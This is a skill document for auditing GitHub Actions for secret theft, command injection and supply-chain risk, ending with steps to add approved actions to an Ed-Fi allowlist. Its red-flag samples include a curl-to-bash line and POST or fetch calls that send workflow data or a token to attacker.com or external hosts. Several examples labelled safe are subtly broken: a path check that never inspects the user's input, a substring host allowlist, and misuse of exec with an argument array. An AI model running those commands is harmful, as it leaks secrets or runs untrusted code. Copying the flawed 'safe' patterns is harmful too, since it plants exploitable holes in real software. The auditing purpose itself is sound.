---
name: reviewing-github-actions
description: Use when auditing a GitHub Action for malicious or undesirable side effects, before deploying or trusting the action in workflows
---

# Reviewing GitHub Actions

## Overview

GitHub Actions can execute arbitrary code in your CI/CD pipeline with access to secrets, repository permissions, and environment variables. Reviewing an action's source code before use is critical for security.

A systematic review checks for dangerous patterns, privilege escalation, secret exposure, and unintended side effects across key files: action metadata, entrypoints, dependencies, and containerization.

## When to Use

- Auditing an unfamiliar GitHub Action before using it
- Reviewing an action for security compliance or risk assessment
- Evaluating custom or third-party actions for malicious code
- Assessing an action update before upgrading

## Setup and Isolation

**Create a temporary, isolated directory for review:**

```bash
TEMP_DIR=$(mktemp -d)
REVIEW_REPO="owner/action-name"  # e.g., EnricoMi/publish-unit-test-result-action
TAG="v2.23.0"  # or commit hash to audit

cd "$TEMP_DIR"
git clone "https://github.com/${REVIEW_REPO}" action-review
cd action-review
git checkout "$TAG"
```

**Why isolation matters:** Actions can be malicious. Reviewing in isolation prevents accidental code execution or side effects.

## Action Types - What You're Auditing

GitHub Actions come in three types - your review approach differs by type:

| Type | Defined By | Examples | Review Focus |
|------|-----------|----------|--------------|
| **Docker** | `runs.using: 'docker'` | Runs in container | Section 3 (Dockerfile) + Section 2 (entrypoint script inside container) |
| **JavaScript/Node** | `runs.using: 'node20'` | Compiled JS/TS | Section 2 (main script) + Section 4 (dependencies) + Input validation |
| **Composite** | `runs.using: 'composite'` | Steps with other actions | Review orchestration + audit child actions |

**Critical:** A Node action that *manages* Docker (spawns docker commands) is NOT a Docker action. It runs in the CI environment and needs input validation, not Dockerfile review.

## Systematic Review Checklist

### 1. Action Metadata (`action.yml` or `action.yaml`)

**What it defines:** Inputs, outputs, permissions, and the entrypoint.

**Check for:**
- [ ] `runs.using`: Is it JavaScript, Docker, or composite? (JavaScript and composite are faster to audit)
- [ ] `runs.main`: What file executes first? Verify it exists and is what you expect
- [ ] `inputs`: Are inputs documented? Do they accept sensitive values (tokens, passwords)?
- [ ] `permissions`: Does the action request only necessary permissions?
  - Common dangerous permissions: `contents: write`, `id-token: write`, `secrets: read` (not standard but dangerous if present)
  - Legitimate permissions: `contents: read`, `issues: read`, `pull-requests: read`

**Red flags:**
```yaml
# ❌ DANGEROUS: Requests write access to code
permissions:
  contents: write

# ✅ GOOD: Read-only
permissions:
  contents: read
```

### 2. Entrypoint and Main Script

**For JavaScript Actions:** Check `runs.main` file (usually `dist/index.js` or `lib/index.js`)

**Dangerous patterns:**
```javascript
// ❌ Command execution
exec('command', { shell: true })
execSync('command', { shell: true })
eval(input)
Function(input)

// ❌ Environment variable injection
process.env['SECRET_NAME'] = userInput
setSecret(userInput)  // Masking user-controlled input

// ❌ Unvalidated file operations
fs.writeFileSync(`/data/${input}/file.txt`)  // Path traversal
require(userInput)    // Dynamic imports
```

**What's safe:**
- Parsing inputs
- Making authenticated API calls with provided tokens
- Creating and publishing artifacts
- Updating issues/PRs with read-only data

### 3. Docker Containerization

**For Docker-based actions:** Check `Dockerfile`

**Check for:**
- [ ] Base image: Is it from an official, trusted registry? (scratch, ubuntu, alpine, official language images)
- [ ] User permissions: Does it run as root? (should use `USER nobody` or `USER 1000`)
- [ ] Layer inspection: Are secrets or credentials built into layers? (should be passed at runtime)
- [ ] Entrypoint: Does it execute a script? Verify that script matches the `action.yml` reference

**Red flags:**
```dockerfile
# ❌ DANGEROUS: Runs as root
FROM python:3.9
RUN pip install ...
ENTRYPOINT ["python", "app.py"]

# ✅ GOOD: Non-root user
FROM python:3.9
RUN useradd -u 1000 worker
USER worker
ENTRYPOINT ["python", "app.py"]
```

### 4. Language-Specific Entrypoint

**For Python:** Check `requirements.txt` and main script

```python
# ❌ DANGEROUS PATTERNS:
import subprocess
subprocess.call(input_data, shell=True)

eval(user_input)
exec(user_input)

os.system('command ' + user_input)
pickle.loads(untrusted_data)

# ✅ SAFE PATTERNS:
import subprocess
subprocess.call(['command', '--arg', safe_input], shell=False)

json.loads(user_input)  # JSON parsing is safe
```

**For Node.js:** Check for dangerous npm packages

```javascript
// ❌ DANGEROUS:
require('child_process').exec(input, callback)

// ✅ SAFE:
require('child_process').execFile('/path/to/binary', [input], callback)
```

### 5. Dependencies and Supply Chain

**Check for:**
- [ ] Direct dependencies: Are they from trusted sources (npm, PyPI)?
- [ ] Pinned versions: Are dependencies pinned (not `@latest` or `*`)?
- [ ] Transitive dependencies: Do you recognize the major dependencies?
- [ ] Frequency of updates: Abandoned projects are risky

**Files to review:**
- `package.json` (Node.js)
- `requirements.txt` (Python)
- `Gemfile` (Ruby)
- `go.sum` (Go)

### 6. Environment and Secret Access

**Check for unwanted access to:**
- [ ] GitHub token usage: Is it used only for GitHub API calls (not passed to external services)?
- [ ] Environment variables: Are all environment variables documented in `action.yml`?
- [ ] Secrets: Does the action access `secrets.*`? Which ones and why?
- [ ] System credentials: Does it read from `~/.ssh`, `~/.aws`, `/etc/`?

**Red flags:**
```javascript
// ❌ DANGEROUS: Token sent to external service
fetch(`https://external-service.com/log?token=${token}`)

// ❌ DANGEROUS: Undocumented secret access
const secret = process.env.UNDOCUMENTED_SECRET

// ✅ GOOD: Token used only for GitHub API
const octokit = new Octokit({ auth: token })
octokit.rest.repos.get(...)
```

### 7. Network and External Calls

**Check for:**
- [ ] URLs hardcoded into the action
- [ ] Are external API calls necessary? What do they do?
- [ ] Is the action calling external webhooks or logging services?
- [ ] Does it download and execute code at runtime?

**Red flags:**
```bash
# ❌ DANGEROUS: Download and execute
curl -s https://example.com/install.sh | bash

# ❌ DANGEROUS: Undocumented external API
curl -X POST https://attacker.com/log -d "workflow=$GITHUB_WORKFLOW"

# ✅ GOOD: Documented external service with explicit purpose
curl -s https://api.github.com/repos/owner/repo
```

### 8. File Operations

**Check for path traversal:**
```python
# ❌ DANGEROUS: User input in path
output_file = f"./{user_input}/result.json"  # Could be ../../secret.txt
with open(output_file, 'w') as f:
    f.write(data)

# ✅ GOOD: Whitelist and validate
safe_dir = os.path.normpath('./outputs')
if not os.path.abspath(safe_dir).startswith(os.path.abspath('.')):
    raise ValueError("Path traversal detected")
```

### 9. Input Validation (Critical for Non-Docker Actions)

**For JavaScript/Node/Composite actions, ALL user inputs are potential attack vectors.**

**Check for:**
- [ ] File paths: Are they validated against path traversal? (`../../../etc/passwd`)
- [ ] URLs: Are external URLs validated? Can users supply arbitrary repositories/downloads?
- [ ] Command arguments: Are they passed as arrays (safe) or concatenated strings (dangerous)?
- [ ] Glob patterns: Can they escape expected directories?

**Dangerous patterns:**
```javascript
// ❌ Path traversal - user input used directly
fs.readFile(userSuppliedPath)  // Could be ../../../secret.txt

// ❌ URL downloads without validation
exec(`git clone ${userUrl}`)   // Could clone malicious repo

// ❌ String concatenation in commands
exec(`docker build -t ${imageName}`)  // Could inject flags

// ✅ SAFE: Path normalization
const normalized = path.normalize(userPath);
if (!normalized.startsWith(safeDir)) throw new Error("Traversal");

// ✅ SAFE: Validated URLs
const allowedHosts = ['github.com', 'registry.example.com'];
if (!allowedHosts.some(h => url.includes(h))) throw new Error("Invalid host");

// ✅ SAFE: Argument arrays (no shell interpretation)
exec('docker', ['build', '-t', imageName, '.'])
```

### 10. Code Review Strategy

**Read code in this order:**
1. `action.yml` - Understand what the action claims to do (determine action type here)
2. `runs.main` entrypoint - The first file that executes
3. Input handling code - Focus on validation of user-supplied inputs
4. Imported modules - Follow dependencies
5. Test files - Understand intended behavior and edge cases
6. Dependencies - Are they necessary?

**Ask for each function:**
- Does this function need to exist?
- Could it be exploited?
- Does it access secrets or system resources?
- Could it read/write files outside expected directories?

## Categorizing Findings

### CRITICAL
- Code execution vulnerabilities (eval, exec, command injection)
- Arbitrary file write/read outside expected paths
- Unmasked secrets in logs
- Privilege escalation (runs as root when unnecessary)

### HIGH
- XXE/XML vulnerabilities
- SSRF (Server-Side Request Forgery)
- Unvalidated external API calls
- Secrets accessible via environment variables without masking

### MEDIUM
- Undocumented permissions or secret access
- Unnecessary dependencies with known vulnerabilities
- Missing input validation
- Unencrypted external communications

### LOW
- Hardcoded values that could be inputs
- Missing documentation
- Non-essential external calls
- Style/quality issues

## Cleanup

**After review, clean up immediately:**
```bash
# Return to original directory
cd /

# Remove temp directory
rm -rf "$TEMP_DIR"
```

**Important:** Never keep a clone of untrusted code in your working directories. Only review in isolated temp locations.

## Integration: Adding Approved Actions to Ed-Fi-Actions Allowlist

Once an action is approved, integrate it into the Ed-Fi-Actions repository:

**1. Fetch main and create a worktree:**
```bash
cd /d/ed-fi/Ed-Fi-Actions
git fetch origin main
git worktree add .claude/worktrees/action-name-tag -b action-name-tag-approval origin/main
cd .claude/worktrees/action-name-tag-approval
```

**2. Update `action-allowedlist/approved.json`:**
Add a new entry with the action link, commit hash (from tag review), and tag:
```json
{
  "actionLink": "owner/action-name",
  "actionVersion": "commit-hash-from-review",
  "tag": "v1.2.3"
}
```

Entries should be ordered chronologically by version within each action group.

**3. Commit with security review summary:**
```bash
git add action-allowedlist/approved.json
git commit -m "Approve owner/action-name vX.Y.Z for use

Security review completed. Findings: [CRITICAL/HIGH/MEDIUM/LOW only].

Co-Authored-By: Claude Haiku 4.5 <noreply@anthropic.com>"
```

**4. Push and create PR:**
```bash
git push -u origin action-name-tag-approval
gh pr create --title "Approve owner/action-name vX.Y.Z" \
  --body "$(cat <<'EOF'
## Summary

Security review of \`owner/action-name@vX.Y.Z\` (commit \`abc123...\`) completed. 

**Findings:** [List severity levels and key findings]

**Details:**
- Action Type: [Docker/Node/Composite]
- Token usage: [How GitHub token is used]
- No code execution vulnerabilities: [Yes/No with specifics]
- External calls: [None/GitHub API only/list what calls are made]

🤖 Generated with [Claude Code](https://claude.com/claude-code)
EOF
)"
```

**Example from dorny/test-reporter v3.0.0:**
```json
{
  "actionLink": "dorny/test-reporter",
  "actionVersion": "a43b3a5f7366b97d083190328d2c652e1a8b6aa2",
  "tag": "v3.0.0"
}
```

## Quick Reference: Dangerous Functions by Language

| Language | Function | Risk |
|----------|----------|------|
| Python | `eval()`, `exec()` | Code execution |
| Python | `pickle.loads()` | Code execution |
| Python | `os.system()` | Command injection |
| Python | `subprocess.call(..., shell=True)` | Command injection |
| Node.js | `eval()` | Code execution |
| Node.js | `Function(code)` | Code execution |
| Node.js | `child_process.exec()` | Command injection |
| Bash | `eval` | Command injection |
| Bash | `` ` `` backticks without quotes | Command injection |
| All | `// require(userInput)` | Arbitrary imports |
| All | `os.system()` or exec with user input | Command injection |

## Report Structure

When documenting findings:

```
## Finding: [Title]

**Severity:** CRITICAL/HIGH/MEDIUM/LOW

**Location:** File path and line number

**Description:** What is the vulnerability?

**Impact:** What could an attacker do?

**Example:**
[Code snippet showing the issue]

**Recommendation:** How should it be fixed?
```

## Common Mistakes

**Overlooking action.yml permissions:** Always check the `permissions` field - it defines what the action can access in your repository.

**Assuming Docker actions are safer:** Docker provides isolation but doesn't prevent malicious behavior - the code inside still runs with those permissions.

**Not checking for lazy imports:** Some languages defer imports until runtime - review lazy-loaded modules too.

**Ignoring transitive dependencies:** An action might have safe direct dependencies but pull in unsafe transitive ones.

**Trusting the action name/description:** Names are not verification. Review the actual code regardless of the action's claimed purpose.

## Real-World Impact

A seemingly innocent GitHub Action can:
- Exfiltrate secrets from `env` or `secrets` context
- Commit malicious code to your repository
- Trigger unwanted API calls using your GitHub token
- Modify workflow behavior for future runs
- Send data to attacker-controlled servers

Systematic review prevents these scenarios.

## After Finding Malicious Code

If your review identifies critical vulnerabilities or malicious code:

1. **Do not use the action** - Remove it from all workflows immediately
2. **Report responsibly** - Contact the maintainer privately if they appear legitimate (vulnerability disclosure)
3. **Report publicly if necessary** - If the maintainer is unresponsive or the action is intentionally malicious:
   - File an issue on the repository
   - Report to GitHub's security team at security@github.com
   - Warn your organization
4. **Audit your history** - Check if the action was used in past workflows, what it had access to, and whether secrets may be compromised
5. **Rotate secrets** - If the action had access to credentials (tokens, API keys), rotate them immediately

## Limitations and Edge Cases

**Composite Actions:** If the action.yml contains `runs.using: composite`, the action chains other actions together. Review not just the orchestration logic but also the child actions it invokes - the chain is only as secure as its weakest link.

**Docker vs Compiled:** Docker actions (especially in CI systems) may have different execution contexts than local. Review the Dockerfile carefully for privilege escalation, but understand it still runs with the permissions defined in the action.yml.

**Transitive Risks:** An action might be safe but depend on an unsafe action - verify major action dependencies too.

**Version Drift:** Review the specific tag or commit you're auditing - `main` branch code may differ significantly from releases.

**Building from Source:** If an action builds artifacts at release time, the built dist/ files may not match source code - compare carefully or rebuild locally and diff.
